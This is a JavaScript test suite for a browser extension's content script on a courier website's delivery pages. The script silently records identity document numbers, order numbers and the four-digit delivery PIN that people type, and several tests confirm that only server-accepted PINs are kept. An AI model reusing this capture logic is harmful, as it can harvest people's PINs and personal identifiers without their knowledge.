/**
 * Pruebas rápidas de captura automática por inputs en content.js.
 */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const EXTENSION_DIR = path.resolve(__dirname, '..');
const SOURCE = fs.readFileSync(path.join(EXTENSION_DIR, 'content.js'), 'utf8');

let listeners = {};
const registrations = [];
const messages = [];
const mutationObservers = [];
const timers = new Map();
let timerSeq = 0;
const sandboxState = {
    claveFields: {},
};

function registerListener(type, handler) {
    listeners[type] ||= [];
    listeners[type].push(handler);
    registrations.push(type);
}

function unregisterListener(type, handler) {
    listeners[type] = (listeners[type] || []).filter((entry) => entry !== handler);
}

function emit(type, target, overrides = {}) {
    if (target?.id && sandboxState.claveFields[target.id]) {
        sandboxState.claveFields[target.id].value = target.value ?? '';
    }
    const event = {
        type,
        target: { nodeType: 1, ...target },
        defaultPrevented: false,
        isComposing: false,
        timeStamp: 1000,
        ...overrides,
    };
    for (const handler of listeners[type] || []) {
        handler(event);
    }
}

function reset() {
    listeners = {};
    registrations.length = 0;
    messages.length = 0;
    mutationObservers.length = 0;
    timers.clear();
    timerSeq = 0;
    sandboxState.claveFields = {};
    sandboxState.confirmForm = null;
    sandboxState.tipodoc = '';
}

// Simula la seleccion del desplegable de tipo de documento (tipodoclist).
function setTipoDoc(value) {
    sandboxState.tipodoc = value;
}

function loadContentScript(sandbox) {
    vm.runInContext(SOURCE, sandbox);
}

function createSandbox() {
    sandboxState.claveFields = {
        'swal-input1': { id: 'swal-input1', value: '' },
        'swal-input2': { id: 'swal-input2', value: '' },
        'swal-input3': { id: 'swal-input3', value: '' },
        'swal-input4': { id: 'swal-input4', value: '' },
    };
    const modal = {
        id: 'modalValidarCodigo',
        style: 'display: block;',
        getAttribute(name) {
            if (name === 'style') return this.style;
            return null;
        },
    };

    return {
        chrome: {
            runtime: {
                // `id` solo existe mientras el contexto de la extension es
                // valido; content.js lo usa como senal de vida.
                id: 'extension-id-de-prueba',
                lastError: undefined,
                sendMessage(message, callback) {
                    messages.push(message);
                    if (typeof callback === 'function') callback();
                },
            },
        },
        document: {
            addEventListener(type, handler) {
                registerListener(type, handler);
            },
            removeEventListener(type, handler) {
                unregisterListener(type, handler);
            },
            documentElement: { nodeType: 1 },
            body: { nodeType: 1 },
            getElementById(id) {
                if (id === 'modalValidarCodigo') return modal;
                if (id === 'tipodoclist') return sandboxState.tipodoc ? { value: sandboxState.tipodoc } : null;
                if (sandboxState.confirmForm && id === sandboxState.confirmForm.id) return sandboxState.confirmForm;
                if (sandboxState.claveFields[id]) return sandboxState.claveFields[id];
                return null;
            },
        },
        MutationObserver: class {
            constructor(callback) {
                this.callback = callback;
                mutationObservers.push(this);
            }
            observe(target, options) {
                this.target = target;
                this.options = options;
            }
            disconnect() {}
        },
        Date: class extends Date {
            static now() {
                return 1_000_000;
            }
        },
        setTimeout(handler, delay) {
            const id = ++timerSeq;
            timers.set(id, { handler, delay });
            return id;
        },
        clearTimeout(id) {
            timers.delete(id);
        },
        console,
        Node: { ELEMENT_NODE: 1 },
    };
}

// El codigo fue correcto: el servidor inyecta el formulario de entrega y
// SweetAlert resetea las casillas del PIN. Ambas cosas a la vez, para que la
// prueba refleje el DOM real: la clave solo puede salir del buffer.
function appearConfirmForm(id, action) {
    for (const field of Object.values(sandboxState.claveFields)) {
        field.value = '';
    }
    sandboxState.confirmForm = {
        id,
        getAttribute(name) {
            if (name === 'action') return action;
            if (name === 'style') return '';
            return null;
        },
    };
    fireRootObservers();
}

// Por defecto simula el formulario de entrega.
function appearEntregaForm() { appearConfirmForm('frmEntrega', 'https://sysprovincia2.shalomcontrol.com/entrega/ajax'); }

function removeEntregaForm() {
    sandboxState.confirmForm = null;
    fireRootObservers();
}

// Los observadores de raiz (documentElement/body) son los que llaman a
// checkEntregaConfirmation; el del modal, si existiera, tiene id propio.
function fireRootObservers() {
    for (const observer of mutationObservers) {
        const targetId = observer.target && observer.target.id;
        if (targetId === 'modalValidarCodigo' || targetId === 'frmEntrega' || targetId === 'formPagoOS') continue;
        observer.callback([{ type: 'childList' }]);
    }
}

function runTimers() {
    const pending = [...timers.entries()];
    timers.clear();
    for (const [, timer] of pending) {
        timer.handler();
    }
}

const tests = [];
const test = (name, fn) => tests.push([name, fn]);

test('DNI por input guarda una vez', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: ' 00456879 ' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'DNI');
    assert.equal(messages[0].data.value, '00456879');
});

test('CE por input guarda una vez', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '004568798' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'CE');
    assert.equal(messages[0].data.value, '004568798');
});

test('RUC por input guarda una vez', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '20004568791' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'RUC');
    assert.equal(messages[0].data.value, '20004568791');
});

test('Clave no se captura si no aparece el formulario de entrega', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '3535' });
    runTimers();
    // El modal se cerro pero el codigo NO era correcto: el formulario nunca
    // aparece. No debe capturarse ninguna clave.
    removeEntregaForm();

    assert.equal(messages.length, 0);
});

test('Clave envia el intento acertado tras un intento fallido', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    // Primer intento equivocado: el formulario no aparece.
    emit('input', { id: 'swal-input1', value: '0000' });
    runTimers();
    removeEntregaForm();
    assert.equal(messages.length, 0);

    // Se corrige y esta vez el formulario aparece: se envia el valor corregido.
    emit('input', { id: 'swal-input1', value: '3535' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '3535');
});

test('Clave se captura tambien con la ventana de comprobante (formPagoOS)', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '4821' });
    runTimers();
    // No aparece el formulario de entrega, sino la ventana Comprobante.
    appearConfirmForm('formPagoOS', 'https://sysprovincia2.shalomcontrol.com/pagos/Generar');

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '4821');
});

test('Clave por input guarda Clave', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '3535' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '3535');
});

test('Clave de 57 guarda un solo registro completo', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '5' });
    emit('input', { id: 'swal-input2', value: '7' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '57');
});

test('Clave conserva ceros iniciales y el primer dígito completo', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '0123' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '0123');
});

test('Clave progresiva por input termina en un solo registro final', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '3' });
    emit('input', { id: 'swal-input1', value: '35' });
    emit('input', { id: 'swal-input1', value: '353' });
    emit('input', { id: 'swal-input1', value: '3535' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '3535');
});

test('Clave de 0123 conserva ceros iniciales', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '0' });
    emit('input', { id: 'swal-input2', value: '1' });
    emit('input', { id: 'swal-input3', value: '2' });
    emit('input', { id: 'swal-input4', value: '3' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '0123');
});

test('OS por input guarda OS', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '71218478' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'OS');
    assert.equal(messages[0].data.value, '71218478');
});

test('DNI sin cambio relevante no guarda', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { nodeType: 1, value: '71218478' });
    emit('blur', { nodeType: 1, value: '71218478' });

    assert.equal(messages.length, 0);
});

test('Clave sin cambio relevante no guarda', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('blur', { nodeType: 1, id: 'swal-input1', value: '3535' });

    assert.equal(messages.length, 0);
});

test('OS sin cambio relevante no guarda', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('blur', { nodeType: 1, id: 'inputnroguia', value: '7121847' });

    assert.equal(messages.length, 0);
});

test('OS progresiva por input termina en un solo registro final', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '8' });
    emit('input', { id: 'inputnroguia', value: '89' });
    emit('input', { id: 'inputnroguia', value: '899' });
    emit('input', { id: 'inputnroguia', value: '8990' });
    emit('input', { id: 'inputnroguia', value: '89906' });
    emit('input', { id: 'inputnroguia', value: '899061' });
    emit('input', { id: 'inputnroguia', value: '8990618' });
    emit('input', { id: 'inputnroguia', value: '89906189' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'OS');
    assert.equal(messages[0].data.value, '89906189');
});

test('OS de más de 8 dígitos se ignora', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '899061890' });
    runTimers();

    assert.equal(messages.length, 0);
});

test('debounce + blur en OS no duplica', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '89906189' });
    emit('blur', { nodeType: 1, id: 'inputnroguia', value: '89906189' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.value, '89906189');
});

test('inputnroguia nunca se clasifica como DNI', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '71218478' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'OS');
    assert.equal(messages[0].data.value, '71218478');
});

test('Clave con valor de 8 dígitos nunca se reclasifica como DNI', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'swal-input1', value: '00456879' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '00456879');
});

test('un input produce un solo registro incluso con doble inicialización', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);
    const before = registrations.filter((type) => type === 'input' || type === 'change').length;
    loadContentScript(sandbox);
    const after = registrations.filter((type) => type === 'input' || type === 'change').length;

    emit('input', { id: 'inputnombre', value: '00456879' });
    emit('change', { id: 'inputnombre', value: '00456879' });

    assert.equal(after, before, 'no debe registrar otro listener');
    assert.equal(messages.length, 1);
});

test('mismo dato en una operación posterior vuelve a guardarse', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    // Dos operaciones distintas: cada una se cierra con su pausa (runTimers).
    emit('input', { id: 'inputnombre', value: '00456879' });
    runTimers();
    emit('input', { id: 'inputnombre', value: '00456879' }, { timeStamp: 5000 });
    runTimers();

    assert.equal(messages.length, 2);
});

// Regresion: al recargar o actualizar la extension, el content script viejo
// sigue vivo en la pagina pero chrome.runtime deja de existir. Antes esto
// reventaba en cada tecla con "Cannot read properties of undefined (reading
// 'sendMessage')".
test('contexto invalidado: no lanza y deja de escuchar', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    sandbox.chrome.runtime = undefined;

    // El documento se captura con debounce: runTimers dispara el envio, que al
    // ver el contexto invalido desmonta la captura sin lanzar.
    assert.doesNotThrow(() => { emit('input', { id: 'inputnombre', value: '00456879' }); runTimers(); });
    assert.equal(messages.length, 0);

    // Tras el desmontaje ya no queda ningun listener activo.
    sandbox.chrome.runtime = { id: 'x', sendMessage(message) { messages.push(message); } };
    emit('input', { id: 'inputnombre', value: '00456879' }, { timeStamp: 5000 });
    runTimers();
    assert.equal(messages.length, 0);
});

test('contexto invalidado: el observador se desconecta sin lanzar', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    sandbox.chrome.runtime = undefined;

    assert.doesNotThrow(() => appearEntregaForm());
    assert.equal(messages.length, 0);
});

test('sendMessage que lanza al invalidarse no propaga el error', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    sandbox.chrome.runtime.sendMessage = () => {
        throw new Error('Extension context invalidated.');
    };

    assert.doesNotThrow(() => { emit('input', { id: 'inputnombre', value: '00456879' }); runTimers(); });
    assert.equal(messages.length, 0);
});

// El documento se captura con debounce: al teclear el numero digito a digito,
// solo debe guardarse UN registro con el numero completo, no uno por tecla.
test('documento por input digito a digito guarda un solo registro completo', () => {
    reset();
    setTipoDoc('RUC');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    for (const parcial of ['2', '20', '203', '2030', '20304526759']) {
        emit('input', { id: 'inputnombre', value: parcial });
    }
    runTimers();

    assert.equal(messages.length, 1, 'debe capturar una sola vez, no por tecla');
    assert.equal(messages[0].data.field, 'RUC');
    assert.equal(messages[0].data.value, '20304526759');
});

// El change que llega DESPUES de que el debounce ya capturo (al salir del campo
// o buscar, con demora) no debe duplicar el registro. Vale para CE, RUC, etc.
test('documento: change tras el debounce ya disparado no duplica (CE)', () => {
    reset();
    setTipoDoc('CE');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '123456789' });
    runTimers(); // el debounce captura (1)
    // change bastante despues, fuera de la ventana de dedupe (1500 ms).
    emit('change', { id: 'inputnombre', value: '123456789' }, { timeStamp: 9000 });

    assert.equal(messages.length, 1, 'el change tras el debounce no debe duplicar');
    assert.equal(messages[0].data.field, 'CE');
    assert.equal(messages[0].data.value, '123456789');
});

test('documento: change tras el debounce ya disparado no duplica (RUC)', () => {
    reset();
    setTipoDoc('RUC');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '20304526759' });
    runTimers();
    emit('change', { id: 'inputnombre', value: '20304526759' }, { timeStamp: 9000 });

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'RUC');
});

// Salir del campo ANTES de que el debounce dispare si debe capturar: el change
// vacia el debounce pendiente y guarda una sola vez.
test('documento: change antes del debounce captura una sola vez', () => {
    reset();
    setTipoDoc('CE');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '123456789' });
    emit('change', { id: 'inputnombre', value: '123456789' }, { timeStamp: 1200 });
    runTimers(); // ya no queda timer pendiente

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.value, '123456789');
});

// El desplegable tipodoclist manda sobre la longitud: es lo que el usuario
// declara como tipo real. Antes se clasificaba solo por digitos/longitud.
test('desplegable PS captura el pasaporte alfanumerico', () => {
    reset();
    setTipoDoc('PS');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: ' ab123456 ' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'PS');
    assert.equal(messages[0].data.value, 'AB123456');
});

test('desplegable CE solo captura con 9 digitos (menos se ignora)', () => {
    reset();
    setTipoDoc('CE');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    // 8 digitos: incompleto para CE, no se captura.
    emit('input', { id: 'inputnombre', value: '12345678' });
    runTimers();
    assert.equal(messages.length, 0, 'CE de 8 digitos no debe capturarse');

    // 9 digitos: completo.
    emit('input', { id: 'inputnombre', value: '123456789' });
    runTimers();
    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'CE');
    assert.equal(messages[0].data.value, '123456789');
});

test('cada tipo solo captura con su longitud exacta', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    // DNI = 8: 7 digitos se ignora, 8 captura.
    setTipoDoc('DNI');
    emit('input', { id: 'inputnombre', value: '1234567' });
    runTimers();
    assert.equal(messages.length, 0, 'DNI de 7 no captura');
    emit('input', { id: 'inputnombre', value: '12345678' });
    runTimers();
    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'DNI');

    // RUC = 11: 10 digitos se ignora, 11 captura.
    setTipoDoc('RUC');
    emit('input', { id: 'inputnombre', value: '2030452675' }, { timeStamp: 20000 });
    runTimers();
    assert.equal(messages.length, 1, 'RUC de 10 no captura');
    emit('input', { id: 'inputnombre', value: '20304526759' }, { timeStamp: 21000 });
    runTimers();
    assert.equal(messages.length, 2);
    assert.equal(messages[1].data.field, 'RUC');
});

test('OS menor de 8 digitos no se captura', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnroguia', value: '7854123' }); // 7 digitos
    runTimers();
    assert.equal(messages.length, 0, 'OS de 7 no captura');

    emit('input', { id: 'inputnroguia', value: '78541232' }, { timeStamp: 20000 }); // 8
    runTimers();
    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'OS');
    assert.equal(messages[0].data.value, '78541232');
});

test('desplegable RUC etiqueta como RUC segun la seleccion', () => {
    reset();
    setTipoDoc('RUC');
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '20304526759' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'RUC');
    assert.equal(messages[0].data.value, '20304526759');
});

test('sin desplegable disponible, cae al respaldo por longitud', () => {
    reset(); // tipodoc = '' -> getElementById('tipodoclist') devuelve null
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    emit('input', { id: 'inputnombre', value: '00456879' });
    runTimers();

    assert.equal(messages.length, 1);
    assert.equal(messages[0].data.field, 'DNI');
    assert.equal(messages[0].data.value, '00456879');
});

// Regresion del "a veces deja de capturar": un formulario de confirmacion que
// pasa el chequeo de visibilidad con el buffer aun vacio (animacion fade de
// Bootstrap u otra operacion en curso) NO debe dejar el latch activado. Antes,
// entregaConfirmed se marcaba antes de leer el buffer, de modo que la clave
// tecleada despues no se capturaba nunca hasta que el modal se ocultaba.
test('form visible con buffer vacio no latchea: captura al teclear despues', () => {
    reset();
    const sandbox = createSandbox();
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    loadContentScript(sandbox);

    // El formulario aparece antes de que exista clave alguna.
    appearEntregaForm();
    assert.equal(messages.length, 0, 'no debe capturar con el buffer vacio');

    // Ahora si se teclea la clave; el formulario sigue presente (nueva mutacion).
    emit('input', { id: 'swal-input1', value: '3535' });
    runTimers();
    appearEntregaForm();

    assert.equal(messages.length, 1, 'debe capturar cuando la clave llega despues');
    assert.equal(messages[0].data.field, 'Clave');
    assert.equal(messages[0].data.value, '3535');
});

if (require.main === module) {
    (async () => {
        for (const [name, fn] of tests) {
            try {
                const out = fn();
                if (out && typeof out.then === 'function') {
                    await out;
                }
                process.stdout.write(`  ✓ ${name}\n`);
            } catch (error) {
                process.stderr.write(`  ✗ ${name}\n`);
                throw error;
            }
        }
    })();
}
